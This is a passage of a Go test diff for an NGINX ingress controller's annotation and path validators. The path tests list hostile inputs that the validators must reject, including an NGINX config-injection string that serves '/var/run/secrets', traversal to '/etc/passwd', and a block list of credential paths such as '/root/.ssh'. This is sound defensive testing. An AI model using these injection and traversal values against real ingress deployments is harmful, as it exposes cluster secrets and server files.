+				`annotations.nginx.org/proxy-set-headers: Invalid value: "Header-2: $bad": invalid character in header value: $`,
+			},
+		},
+		{
+			name:  "invalid dollar sign in header name without colon",
+			value: "$Header",
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-set-headers: Invalid value: "$Header": ` + headerNameErrMsg,
+			},
+		},
+		{
+			name:  "invalid dollar sign in both name and value",
+			value: "$Header: $value",
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-set-headers: Invalid value: "$Header": ` + headerNameErrMsg,
+				`annotations.nginx.org/proxy-set-headers: Invalid value: "$Header: $value": invalid character in header value: $`,
+			},
+		},
+
+		// ── Invalid: malformed header names ──────────────────────────
+		{
+			name:  "invalid special char in header name - curly brace",
+			value: "{Header",
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-set-headers: Invalid value: "{Header": ` + headerNameErrMsg,
+			},
+		},
+		{
+			name:  "invalid special char in header name - exclamation mark",
+			value: "Header!Name",
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-set-headers: Invalid value: "Header!Name": ` + headerNameErrMsg,
+			},
+		},
+		{
+			name:  "invalid header name with underscore",
+			value: "Header_Name",
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-set-headers: Invalid value: "Header_Name": ` + headerNameErrMsg,
+			},
+		},
+		{
+			name:  "invalid header name with dot",
+			value: "Header.Name",
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-set-headers: Invalid value: "Header.Name": ` + headerNameErrMsg,
+			},
+		},
+
+		// ── Invalid: spaces without colon (caught by IsHTTPHeaderName) ─
+		{
+			name:  "invalid header name with spaces and no colon",
+			value: "X Forwarded For",
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-set-headers: Invalid value: "X Forwarded For": ` + headerNameErrMsg,
+			},
+		},
+
+		// ── Edge: empty entries are skipped ───────────────────────────
+		{
+			name:  "colon only - empty name",
+			value: ":",
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-set-headers: Invalid value: ":": empty header name`,
+			},
+		},
+		{
+			name:  "colon with value but no name",
+			value: ": value",
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-set-headers: Invalid value: ": value": empty header name`,
+			},
+		},
+		{
+			name:  "empty header between commas is skipped",
+			value: "Header-1,,Header-2",
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-set-headers: Invalid value: "": empty header name`,
+			},
+		},
+		{
+			name:  "multiple commas only - all empty entries skipped",
+			value: ",,,",
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-set-headers: Invalid value: "": empty header name`,
+				`annotations.nginx.org/proxy-set-headers: Invalid value: "": empty header name`,
+				`annotations.nginx.org/proxy-set-headers: Invalid value: "": empty header name`,
+				`annotations.nginx.org/proxy-set-headers: Invalid value: "": empty header name`,
+			},
+		},
+
+		// ── Multiple errors in one annotation ────────────────────────
+		{
+			name:  "multiple invalid headers in one annotation",
+			value: "$header1,{header2",
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-set-headers: Invalid value: "$header1": ` + headerNameErrMsg,
+				`annotations.nginx.org/proxy-set-headers: Invalid value: "{header2": ` + headerNameErrMsg,
+			},
+		},
+		{
+			name:  "dollar sign in values of multiple headers",
+			value: "Header-1: $val1,Header-2: $val2",
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-set-headers: Invalid value: "Header-1: $val1": invalid character in header value: $`,
+				`annotations.nginx.org/proxy-set-headers: Invalid value: "Header-2: $val2": invalid character in header value: $`,
+			},
+		},
+
+		// ── Edge: special chars in value (non-$) ─────────────────────
+		{
+			name:           "valid header with special chars in value but no dollar sign",
+			value:          "X-Header: value-with-{braces}",
+			expectedErrors: nil,
+		},
+		{
+			name:           "valid header with colons in value",
+			value:          "X-Header: value:with:colons",
+			expectedErrors: nil,
+		},
+
+		// ── Edge: whitespace handling ────────────────────────────────
+		{
+			name:           "leading and trailing whitespace in whole value",
+			value:          "  X-Header  ",
+			expectedErrors: nil,
+		},
+		{
+			name:           "whitespace around name and value with colon",
+			value:          "  X-Header  :  myvalue  ",
+			expectedErrors: nil,
+		},
+
+		// ── Edge: empty name combined with dollar in value ───────────
+		{
+			// Empty name is caught early and skips further validation,
+			// so the $ in value is not reported separately.
+			name:  "empty name with dollar in value",
+			value: ": $value",
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-set-headers: Invalid value: ": $value": empty header name`,
+			},
+		},
+
+		// ── Valid: properly escaped quotes and backslashes ──────────
+		{
+			name:           "valid header with escaped double quote",
+			value:          `X-Header: value with \"escaped quote\"`,
+			expectedErrors: nil,
+		},
+		{
+			name:           "valid header with escaped backslash",
+			value:          `X-Path: C:\\Windows\\path`,
+			expectedErrors: nil,
+		},
+		{
+			name:           "valid header with mixed escaped chars",
+			value:          `X-Header: path\\to\\\"file\"`,
+			expectedErrors: nil,
+		},
+
+		// ── Invalid: unescaped quotes and backslashes ─────────────────
+		{
+			name:  "invalid header with unescaped double quote",
+			value: `X-Bad: "unquoted value"`,
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-set-headers: Invalid value: "X-Bad: \"unquoted value\"": must have all '"' (double quotes) escaped and must not end with an unescaped '\' (backslash) (regex used for validation is '([^"\\]|\\.)*')`,
+			},
+		},
+		{
+			name:  "invalid header with unescaped backslash at end",
+			value: `X-Bad: value\`,
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-set-headers: Invalid value: "X-Bad: value\\": must have all '"' (double quotes) escaped and must not end with an unescaped '\' (backslash) (regex used for validation is '([^"\\]|\\.)*')`,
+			},
+		},
+	}
+
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			t.Parallel()
+			ctx := &annotationValidationContext{
+				value:     tc.value,
+				fieldPath: field.NewPath("annotations").Child(configs.ProxySetHeadersAnnotation),
+			}
+			allErrs := validateProxySetHeaderAnnotation(ctx)
+			assertion := assertErrors("validateProxySetHeaderAnnotation()", tc.name, allErrs, tc.expectedErrors)
+			if assertion != "" {
+				t.Error(assertion)
+			}
+		})
+	}
+}
+
+func TestValidateAddHeaderAnnotation(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		name           string
+		value          string
+		expectedErrors []string
+	}{
+		// ── Valid inputs ──────────────────────────────────────────────
+		{
+			name:           "valid Name:Value",
+			value:          "X-Frame-Options:DENY",
+			expectedErrors: nil,
+		},
+		{
+			name:           "valid Name:Value:always",
+			value:          "X-Frame-Options:DENY:always",
+			expectedErrors: nil,
+		},
+		{
+			name:           "always flag is case-insensitive uppercase",
+			value:          "X-Custom:value:ALWAYS",
+			expectedErrors: nil,
+		},
+		{
+			name:           "always flag is case-insensitive mixed",
+			value:          "X-Custom:value:Always",
+			expectedErrors: nil,
+		},
+		{
+			name:           "multiple headers comma-separated",
+			value:          "X-Frame-Options:DENY, X-Content-Type:nosniff",
+			expectedErrors: nil,
+		},
+		{
+			name:           "header with name only (empty value)",
+			value:          "X-Header:",
+			expectedErrors: nil,
+		},
+		{
+			name:           "header with whitespace around parts",
+			value:          "  X-Header  :  myvalue  :  always  ",
+			expectedErrors: nil,
+		},
+		{
+			name:           "header with escaped double quote in value",
+			value:          `X-Header:val\"ue`,
+			expectedErrors: nil,
+		},
+
+		{
+			name:           "trailing colon produces empty flag (should be valid)",
+			value:          "X-Foo:bar:",
+			expectedErrors: nil,
+		},
+
+		// ── Invalid: $ in value ───────────────────────────────────────
+		{
+			name:  "dollar sign in value",
+			value: "X-Header:$upstream_addr",
+			expectedErrors: []string{
+				`annotations.nginx.org/add-header: Invalid value: "X-Header:$upstream_addr": invalid character in header value: $`,
+			},
+		},
+		{
+			name:  "dollar sign in value of second header",
+			value: "X-Good:ok,X-Bad:$bad",
+			expectedErrors: []string{
+				`annotations.nginx.org/add-header: Invalid value: "X-Bad:$bad": invalid character in header value: $`,
+			},
+		},
+
+		// ── Invalid: bad header name ──────────────────────────────────
+		{
+			name:  "dollar sign in header name",
+			value: "$bad-header:value",
+			expectedErrors: []string{
+				`annotations.nginx.org/add-header: Invalid value: "$bad-header": ` + headerNameErrMsg,
+			},
+		},
+		{
+			name:  "empty header name (colon-only entry)",
+			value: ":value",
+			expectedErrors: []string{
+				`annotations.nginx.org/add-header: Invalid value: ":value": empty header name`,
+			},
+		},
+
+		// ── Invalid: bad always flag ──────────────────────────────────
+		{
+			name:  "invalid flag string",
+			value: "X-Header:value:badFlag",
+			expectedErrors: []string{
+				`annotations.nginx.org/add-header: Invalid value: "X-Header:value:badFlag": invalid flag "badFlag": must be "always" or empty`,
+			},
+		},
+		{
+			name:  "numeric flag",
+			value: "X-Header:value:1",
+			expectedErrors: []string{
+				`annotations.nginx.org/add-header: Invalid value: "X-Header:value:1": invalid flag "1": must be "always" or empty`,
+			},
+		},
+
+		// ── Invalid: empty entries ────────────────────────────────────
+		{
+			name:  "empty entry from consecutive commas",
+			value: "X-Header:val,,X-Other:val2",
+			expectedErrors: []string{
+				`annotations.nginx.org/add-header: Invalid value: "": empty entry in add-header annotation`,
+			},
+		},
+		{
+			name:  "leading comma produces empty entry",
+			value: ",X-Header:val",
+			expectedErrors: []string{
+				`annotations.nginx.org/add-header: Invalid value: "": empty entry in add-header annotation`,
+			},
+		},
+
+		// ── Invalid: unescaped characters in value ────────────────────
+		{
+			name:  "unescaped double quote in value",
+			value: `X-Bad:"unquoted"`,
+			expectedErrors: []string{
+				`annotations.nginx.org/add-header: Invalid value: "X-Bad:\"unquoted\"": must have all '"' (double quotes) escaped and must not end with an unescaped '\' (backslash) (regex used for validation is '([^"\\]|\\.)*')`,
+			},
+		},
+		{
+			name:  "unescaped backslash at end of value",
+			value: `X-Bad:value\`,
+			expectedErrors: []string{
+				`annotations.nginx.org/add-header: Invalid value: "X-Bad:value\\": must have all '"' (double quotes) escaped and must not end with an unescaped '\' (backslash) (regex used for validation is '([^"\\]|\\.)*')`,
+			},
+		},
+	}
+
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			t.Parallel()
+			ctx := &annotationValidationContext{
+				value:     tc.value,
+				fieldPath: field.NewPath("annotations").Child(configs.AddHeaderAnnotation),
+			}
+			allErrs := validateAddHeaderAnnotation(ctx)
+			assertion := assertErrors("validateAddHeaderAnnotation()", tc.name, allErrs, tc.expectedErrors)
+			if assertion != "" {
+				t.Error(assertion)
+			}
+		})
+	}
+}
+
+func TestGetSpecServices(t *testing.T) {
+	t.Parallel()
+	tests := []struct {
+		spec     networking.IngressSpec
+		expected map[string]bool
+		msg      string
+	}{
+		{
+			spec: networking.IngressSpec{
+				DefaultBackend: &networking.IngressBackend{
+					Service: &networking.IngressServiceBackend{
+						Name: "svc1",
+					},
+				},
+				Rules: []networking.IngressRule{
+					{
+						IngressRuleValue: networking.IngressRuleValue{
+							HTTP: &networking.HTTPIngressRuleValue{
+								Paths: []networking.HTTPIngressPath{
+									{
+										Path: "/",
+										Backend: networking.IngressBackend{
+											Service: &networking.IngressServiceBackend{
+												Name: "svc2",
+											},
+										},
+									},
+								},
+							},
+						},
+					},
+				},
+			},
+			expected: map[string]bool{
+				"svc1": true,
+				"svc2": true,
+			},
+			msg: "services are referenced",
+		},
+		{
+			spec: networking.IngressSpec{
+				DefaultBackend: &networking.IngressBackend{},
+				Rules: []networking.IngressRule{
+					{
+						IngressRuleValue: networking.IngressRuleValue{
+							HTTP: &networking.HTTPIngressRuleValue{
+								Paths: []networking.HTTPIngressPath{
+									{
+										Path:    "/",
+										Backend: networking.IngressBackend{},
+									},
+								},
+							},
+						},
+					},
+				},
+			},
+			expected: map[string]bool{},
+			msg:      "services are not referenced",
+		},
+	}
+
+	for _, test := range tests {
+		result := getSpecServices(test.spec)
+		if !reflect.DeepEqual(result, test.expected) {
+			t.Errorf("getSpecServices() returned %v but expected %v for the case of %s", result, test.expected, test.msg)
+		}
+	}
+}
+
+func TestValidateRegexPath(t *testing.T) {
+	t.Parallel()
+	tests := []struct {
+		regexPath string
+		msg       string
+	}{
+		{
+			regexPath: "/foo.*\\.jpg",
+			msg:       "case sensitive regexp",
+		},
+		{
+			regexPath: "/Bar.*\\.jpg",
+			msg:       "case insensitive regexp",
+		},
+		{
+			regexPath: `/f\"oo.*\\.jpg`,
+			msg:       "regexp with escaped double quotes",
+		},
+		{
+			regexPath: "/[0-9a-z]{4}[0-9]+",
+			msg:       "regexp with curly braces",
+		},
+		{
+			regexPath: "~ ^/coffee/(?!.*\\/latte)(?!.*\\/americano)(.*)",
+			msg:       "regexp with Perl5 regex",
+		},
+	}
+
+	for _, test := range tests {
+		allErrs := validateRegexPath(test.regexPath, field.NewPath("path"))
+		if len(allErrs) != 0 {
+			t.Errorf("validateRegexPath(%v) returned errors for valid input for the case of %v", test.regexPath, test.msg)
+		}
+	}
+}
+
+func TestValidateRegexPathFails(t *testing.T) {
+	t.Parallel()
+	tests := []struct {
+		regexPath string
+		msg       string
+	}{
+		{
+			regexPath: "[{",
+			msg:       "invalid regexp",
+		},
+		{
+			regexPath: `/foo"`,
+			msg:       "unescaped double quotes",
+		},
+		{
+			regexPath: `"`,
+			msg:       "empty regex",
+		},
+		{
+			regexPath: `/foo\`,
+			msg:       "ending in backslash",
+		},
+	}
+
+	for _, test := range tests {
+		allErrs := validateRegexPath(test.regexPath, field.NewPath("path"))
+		if len(allErrs) == 0 {
+			t.Errorf("validateRegexPath(%v) returned no errors for invalid input for the case of %v", test.regexPath, test.msg)
+		}
+	}
+}
+
+func TestValidatePath(t *testing.T) {
+	t.Parallel()
+
+	validPaths := []string{
+		"/",
+		"/path",
+		"/a-1/_A/",
+		"/[A-Za-z]{6}/[a-z]{1,2}",
+		"/[0-9a-z]{4}[0-9]",
+		"/foo.*\\.jpg",
+		"/Bar.*\\.jpg",
+		`/f\"oo.*\\.jpg`,
+		"/[0-9a-z]{4}[0-9]+",
+		"/[a-z]{1,2}",
+		"/[A-Z]{6}",
+		"/[A-Z]{6}/[a-z]{1,2}",
+		"/path",
+		"/abc}{abc",
+	}
+
+	pathType := networking.PathTypeExact
+
+	for _, path := range validPaths {
+		allErrs := validatePath(path, &pathType, field.NewPath("path"))
+		if len(allErrs) > 0 {
+			t.Errorf("validatePath(%q) returned errors %v for valid input", path, allErrs)
+		}
+	}
+
+	invalidPaths := []string{
+		"",
+		" /",
+		"/ ",
+		"/abc;",
+		`/path\`,
+		`/path\n`,
+		"/foo\u0085bar",
+		`/var/run/secrets`,
+		"/{autoindex on; root /var/run/secrets;}location /tea",
+		"/{root}",
+		"//evil.com/payload",
+		"/api/../etc/passwd",
+		`/api/..\admin`,
+		"/api/..",
+		"/a/b/..",
+	}
+
+	for _, path := range invalidPaths {
+		allErrs := validatePath(path, &pathType, field.NewPath("path"))
+		if len(allErrs) == 0 {
+			t.Errorf("validatePath(%q) returned no errors for invalid input", path)
+		}
+	}
+
+	pathType = networking.PathTypeImplementationSpecific
+
+	allErrs := validatePath("", &pathType, field.NewPath("path"))
+	if len(allErrs) > 0 {
+		t.Errorf("validatePath with empty path and type ImplementationSpecific returned errors %v for valid input", allErrs)
+	}
+}
+
+func TestValidateCurlyBraces(t *testing.T) {
+	t.Parallel()
+
+	validPaths := []string{
+		"/[a-z]{1,2}",
+		"/[A-Z]{6}",
+		"/[A-Z]{6}/[a-z]{1,2}",
+		"/path",
+		"/abc}{abc",
+	}
+
+	for _, path := range validPaths {
+		allErrs := validateCurlyBraces(path, field.NewPath("path"))
+		if len(allErrs) > 0 {
+			t.Errorf("validatePath(%q) returned errors %v for valid input", path, allErrs)
+		}
+	}
+
+	invalidPaths := []string{
+		"/[A-Z]{a}",
+		"/{abc}abc",
+		"/abc{a1}",
+	}
+
+	for _, path := range invalidPaths {
+		allErrs := validateCurlyBraces(path, field.NewPath("path"))
+		if len(allErrs) == 0 {
+			t.Errorf("validateCurlyBraces(%q) returned no errors for invalid input", path)
+		}
+	}
+}
+
+func TestValidateIllegalKeywords(t *testing.T) {
+	t.Parallel()
+
+	invalidPaths := []string{
+		"/root",
+		"/root/",
+		"/root/.ssh",
+		"/etc/nginx/secrets",
+		"/etc/passwd",
+		"/var",
+		"/var/run/secrets",
+		`\n`,
+		`\r`,
+	}
+
+	for _, path := range invalidPaths {
+		allErrs := validateIllegalKeywords(path, field.NewPath("path"))
+		if len(allErrs) == 0 {
+			t.Errorf("validateIllegalKeywords(%q) returned no errors for invalid input", path)
+		}
+	}
+
+	validPaths := []string{
+		"/variables",
+		"/var-config",
+		"/manager/variables",
+		"/api/variables/list",
+		"/rootpage",
+		"/root-cause",
+		"/tree/root",
+		"/etcetera",
+		"/etcd",
+		"/fetch",
+	}
+
+	for _, path := range validPaths {
+		allErrs := validateIllegalKeywords(path, field.NewPath("path"))
+		if len(allErrs) != 0 {
+			t.Errorf("validateIllegalKeywords(%q) returned errors %v for valid input", path, allErrs)
+		}
+	}
+}
+
+func TestValidatePolicyNames(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		name           string
+		value          string
+		expectErrors   bool
+		expectedErrMsg []string
+	}{
+		// Positive test cases - Simple policy names
+		{
+			name:         "valid single policy name",
+			value:        "my-policy",
+			expectErrors: false,
+		},
+		{
+			name:         "valid policy with numbers",
+			value:        "policy123",
+			expectErrors: false,
+		},
+		{
+			name:         "valid policy with hyphens",
+			value:        "my-policy-name",
+			expectErrors: false,
+		},
+		{
+			name:         "valid policy with dots",
+			value:        "policy.name.test",
+			expectErrors: false,
+		},
+		{
+			name:         "valid single character policy",
+			value:        "a",
+			expectErrors: false,
+		},
+		{
+			name:         "valid policy starting with number",
+			value:        "1policy",
+			expectErrors: false,
+		},
+
+		// Positive test cases - Namespaced policies
+		{
+			name:         "valid namespaced policy",
+			value:        "namespace/policy-name",
+			expectErrors: false,
+		},
+		{
+			name:         "valid namespaced policy with numbers",
+			value:        "ns123/policy456",
+			expectErrors: false,
+		},
+		{
+			name:         "valid namespaced policy with dots",
+			value:        "namespace.test/policy.example",
+			expectErrors: false,
+		},
+		{
+			name:         "valid single character namespace and policy",
+			value:        "a/b",
+			expectErrors: false,
+		},
+		{
+			name:         "valid namespace and policy with numbers",
+			value:        "1ns/2policy",
+			expectErrors: false,
+		},
+
+		// Positive test cases - Multiple policies
+		{
+			name:         "valid multiple policies",
+			value:        "policy1,policy2,policy3",
+			expectErrors: false,
+		},
+		{
+			name:         "valid multiple namespaced policies",
+			value:        "ns1/policy1,ns2/policy2",
+			expectErrors: false,
+		},
+		{
+			name:         "valid mixed policies",
+			value:        "policy1,ns1/policy2,policy3",
+			expectErrors: false,
+		},
+		{
+			name:         "valid policies with spaces around commas",
+			value:        "policy1, policy2 , ns1/policy3",
+			expectErrors: false,
+		},
+		{
+			name:         "valid policies with tabs and newlines",
+			value:        "policy1,\tpolicy2,\n ns1/policy3 ",
+			expectErrors: false,
+		},
+
+		// Positive test cases - Edge cases within limits
+		{
+			name:         "maximum length policy name",
+			value:        strings.Repeat("a", 63),
+			expectErrors: false,
+		},
+		{
+			name:         "maximum length namespace and policy",
+			value:        strings.Repeat("a", 63) + "/" + strings.Repeat("b", 63),
+			expectErrors: false,
+		},
+		{
+			name:         "policy with maximum dot-separated labels",
+			value:        "a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.x.y.z",
+			expectErrors: false,
+		},
+
+		// Edge cases with multiple slashes (only first slash is significant)
+		{
+			name:           "policy name with additional slashes",
+			value:          "namespace/policy/with/slashes",
+			expectErrors:   true,                                                  // Only first slash is used for namespace/policy split
+			expectedErrMsg: []string{"policy name must be a valid DNS subdomain"}, // The part after first slash is treated as policy name and fails validation
+		},
+		{
+			name:           "multiple slashes in policy name",
+			value:          "ns/policy//name",
+			expectErrors:   true, // Everything after first slash is treated as policy name
+			expectedErrMsg: []string{"policy name must be a valid DNS subdomain"},
+		},
+
+		// Negative test cases - Empty values
+		{
+			name:           "completely empty value",
+			value:          "",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy name cannot be empty"},
+		},
+		{
+			name:           "empty policy in list",
+			value:          "policy1,,policy2",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy name cannot be empty"},
+		},
+		{
+			name:           "only whitespace",
+			value:          "   ",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy name cannot be empty"},
+		},
+		{
+			name:           "only tabs and newlines",
+			value:          "\t\n\r  ",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy name cannot be empty"},
+		},
+		{
+			name:           "empty policy after comma",
+			value:          "policy1,",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy name cannot be empty"},
+		},
+		{
+			name:           "empty policy before comma",
+			value:          ",policy1",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy name cannot be empty"},
+		},
+		{
+			name:           "whitespace only policy in list",
+			value:          "policy1,  ,policy2",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy name cannot be empty"},
+		},
+
+		// Negative test cases - Empty namespace or policy in namespaced format
+		{
+			name:           "empty namespace",
+			value:          "/policy",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy namespace cannot be empty"},
+		},
+		{
+			name:           "empty policy name in namespaced policy",
+			value:          "namespace/",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy name cannot be empty"},
+		},
+		{
+			name:           "both namespace and policy empty",
+			value:          "/",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy namespace cannot be empty", "policy name cannot be empty"},
+		},
+		{
+			name:           "namespace with only whitespace",
+			value:          "  /policy",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy namespace cannot be empty"},
+		},
+		{
+			name:           "policy with only whitespace after slash",
+			value:          "namespace/  ",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy name cannot be empty"},
+		},
+
+		// Negative test cases - Invalid DNS subdomain names for policy
+		{
+			name:           "policy name with uppercase",
+			value:          "PolicyName",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy name must be a valid DNS subdomain"},
+		},
+		{
+			name:           "policy name with underscore",
+			value:          "policy_name",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy name must be a valid DNS subdomain"},
+		},
+		{
+			name:           "policy name starting with hyphen",
+			value:          "-policy",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy name must be a valid DNS subdomain"},
+		},
+		{
+			name:           "policy name ending with hyphen",
+			value:          "policy-",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy name must be a valid DNS subdomain"},
+		},
+		{
+			name:           "policy name starting with dot",
+			value:          ".policy",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy name must be a valid DNS subdomain"},
+		},
+		{
+			name:           "policy name ending with dot",
+			value:          "policy.",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy name must be a valid DNS subdomain"},
+		},
+		{
+			name:           "policy name with consecutive dots",
+			value:          "policy..name",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy name must be a valid DNS subdomain"},
+		},
+		{
+			name:         "policy name too long",
+			value:        strings.Repeat("a", 254),
+			expectErrors: true,
+		},
+		{
+			name:           "policy name with space",
+			value:          "policy name",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy name must be a valid DNS subdomain"},
+		},
+		{
+			name:           "policy name with special characters",
+			value:          "policy@name",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy name must be a valid DNS subdomain"},
+		},
+
+		// Negative test cases - Invalid namespace in namespaced policies
+		{
+			name:           "namespace with uppercase",
+			value:          "NameSpace/policy",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy namespace must be a valid DNS subdomain"},
+		},
+		{
+			name:           "namespace with underscore",
+			value:          "name_space/policy",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy namespace must be a valid DNS subdomain"},
+		},
+		{
+			name:           "namespace starting with hyphen",
+			value:          "-namespace/policy",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy namespace must be a valid DNS subdomain"},
+		},
+		{
+			name:           "namespace ending with hyphen",
+			value:          "namespace-/policy",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy namespace must be a valid DNS subdomain"},
+		},
+		{
+			name:           "namespace starting with dot",
+			value:          ".namespace/policy",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy namespace must be a valid DNS subdomain"},
+		},
+		{
+			name:           "namespace ending with dot",
+			value:          "namespace./policy",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy namespace must be a valid DNS subdomain"},
+		},
+		{
+			name:         "namespace too long",
+			value:        strings.Repeat("a", 254) + "/policy",
+			expectErrors: true,
+		},
+		{
+			name:           "namespace with space",
+			value:          "name space/policy",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy namespace must be a valid DNS subdomain"},
+		},
+		{
+			name:           "namespace with special characters",
+			value:          "ns@test/policy",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy namespace must be a valid DNS subdomain"},
+		},
+
+		// Negative test cases - Mixed valid and invalid
+		{
+			name:           "mix of valid and invalid policies",
+			value:          "valid-policy,INVALID-POLICY,another-valid",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy name must be a valid DNS subdomain"},
+		},
+		{
+			name:           "valid namespace with invalid policy",
+			value:          "valid-namespace/INVALID-POLICY",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy name must be a valid DNS subdomain"},
+		},
+		{
+			name:           "invalid namespace with valid policy",
+			value:          "INVALID-NAMESPACE/valid-policy",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy namespace must be a valid DNS subdomain"},
+		},
+		{
+			name:           "both namespace and policy invalid",
+			value:          "INVALID-NS/INVALID-POLICY",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy namespace must be a valid DNS subdomain", "policy name must be a valid DNS subdomain"},
+		},
+		{
+			name:           "multiple errors in list",
+			value:          "valid-policy,,INVALID-CASE,/empty-ns,ns/",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy name cannot be empty", "policy name must be a valid DNS subdomain", "policy namespace cannot be empty"},
+		},
+
+		// Negative test cases - Unicode and special characters
+		{
+			name:           "policy name with unicode characters",
+			value:          "policyñame",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy name must be a valid DNS subdomain"},
+		},
+		{
+			name:           "policy name with emoji",
+			value:          "policy🚀name",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy name must be a valid DNS subdomain"},
+		},
+		{
+			name:           "policy name with chinese characters",
+			value:          "policy中文",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy name must be a valid DNS subdomain"},
+		},
+		{
+			name:           "namespace with unicode",
+			value:          "nameспейс/policy",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy namespace must be a valid DNS subdomain"},
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			context := &annotationValidationContext{
+				value:     tt.value,
+				fieldPath: field.NewPath("test"),
+			}
+
+			errors := validatePolicyNames(context)
+
+			if tt.expectErrors {
+				if len(errors) == 0 {
+					t.Errorf("Expected validation errors for %q, but got none", tt.value)
+					return
+				}
+
+				// Check that each expected error message appears in at least one error
+				for _, expectedMsg := range tt.expectedErrMsg {
+					found := false
+					for _, err := range errors {
+						if strings.Contains(err.Detail, expectedMsg) {
+							found = true
+							break
+						}
+					}
+					if !found {
+						t.Errorf("Expected error message %q not found in errors: %v", expectedMsg, errors)
+					}
+				}
+			} else {
+				if len(errors) > 0 {
+					t.Errorf("Expected no validation errors for %q, but got: %v", tt.value, errors)
+				}
+			}
+		})
+	}
+}
+
+// TestValidatePolicyNamesFuzzing tests the function with generated fuzzy inputs
+func TestValidatePolicyNamesFuzzing(t *testing.T) {
+	t.Parallel()
+
+	// Generate fuzzy test inputs
+	fuzzyInputs := []string{
+		// Random special characters
+		"policy!@#$%^&*()",
+		"policy[]{};':\"<>?",
+		"policy~`|\\+=",
+		"policy/name!@#",
+		"ns@#$/policy",
+
+		// Mixed valid and invalid characters
+		"valid-policy,invalid!policy",
+		"ns1/policy1,ns@2/policy2",
+		"good,bad_name,ugly-CASE",
+
+		// Boundary length cases
+		"a",                      // Minimum length
+		strings.Repeat("a", 253), // Very long
+
+		// Various whitespace combinations
+		" policy ",
+		"  policy1  ,  policy2  ",
+		"\tpolicy\t",
+		"\npolicy\n",
+		"\rpolicy\r",
+		"\f\vpolicy\b",
+
+		// Empty and whitespace variations
+		",",
+		" , ",
+		",,",
+		" ,, ",
+		"   ,   ",
+		"\t,\n",
+
+		// Slash variations
+		"/",
+		"//",
+		"///",
+		"a/",
+		"/a",
+		"a//b",
+		"a/b/",
+		"/a/b",
+		"a/b/c/d/e",
+		"//a//b//",
+		"namespace///policy",
+
+		// Dot variations
+		".",
+		"..",
+		"...",
+		"a.",
+		".a",
+		"a..b",
+		"a.b.",
+		".a.b",
+		"ns./pol.icy",
+		".ns/.pol",
+
+		// Hyphen variations
+		"-",
+		"--",
+		"a-",
+		"-a",
+		"a--b",
+		"-ns/-pol",
+		"ns-/pol-",
+
+		// Number variations
+		"123",
+		"123abc",
+		"abc123",
+		"1a2b3c",
+		"123/456",
+		"0/0",
+
+		// Case variations
+		"POLICY",
+		"Policy",
+		"pOlIcY",
+		"NAMESPACE/POLICY",
+		"Namespace/Policy",
+		"CamelCase/kebab-case",
+
+		// Unicode and non-ASCII
+		"policyé",
+		"policy™",
+		"policy中文",
+		"policy🚀",
+		"пространство/политика",
+		"名前空間/ポリシー",
+		"네임스페이스/정책",
+
+		// Control characters
+		"policy\x00name",
+		"policy\x01name",
+		"policy\x1fname",
+		"policy\x7fname",
+		"ns\x00/policy\x01",
+
+		// Very long strings with various separators
+		strings.Repeat("very-long-policy-name-", 10),
+		strings.Repeat("a", 500) + "/" + strings.Repeat("b", 500),
+		strings.Repeat("ns,", 100) + "policy",
+		strings.Join(make([]string, 1000), "policy,") + "final",
+
+		// Mixed chaos
